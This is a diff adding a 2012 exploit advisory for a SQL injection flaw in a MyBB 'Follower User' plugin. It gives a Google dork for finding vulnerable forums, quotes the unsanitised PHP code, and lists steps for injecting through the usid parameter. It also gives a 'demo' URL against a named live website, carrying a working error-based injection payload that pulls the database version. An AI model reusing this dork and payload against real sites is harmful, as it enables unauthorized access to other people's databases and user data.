@@ -1,0 +1,41 @@
+# Exploit Title: Follower User MyBB plugin SQL Injection 0day
+# Google Dork: intext:"Users subscribed to" inurl:member.php -site:fwcombie.us
+# Date: 13.10.2012
+# Exploit Author: Zixem
+# Software Link: http://mods.mybb.com/view/suscriber-user
+# Version: 1.5+
+# Tested on: Linux.
+----------------------------------------------
+
+The vulnerabillity exist within SuscribeUsers.php on SuscribeUsers_add():
+
+<?
+	$usid = $mybb->input[usid];	//Line 671
+	$uid = $mybb->input[uid];	//Line 672
+	if(user_awaiting($uid,$usid))	//Line 781
+	{				//Line 782
+		redirect("member.php?action=profile&uid=".$usid."#suscriberuser", $lang->double_suscription_awaiting,$lang->suscriberuser); // Line 783
+	}				//Line 784
+?>
+
+
+----------------------------------------------
+
+Instructions: 
+1. Create a new account on the target site.
+2. Check your User ID by entering your profile link and write it down.
+3. Enter here and start to inject your code:
+
+/misc.php?suscriberuser=yes&usid='[SQLi]--+-&uid=[Your_User_ID]
+
+----------------------------------------------
+
+Demo: 
+http://www.chidomobil-gc.com/misc.php?suscriberuser=yes&usid=' or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0)--+-2&uid=[your_uid]
+Image : http://i.imgur.com/eGhzJ.png
+
+
+Follow: https://twitter.com/PonyBlaze
+
+
+Shotouts goes to FillySec.
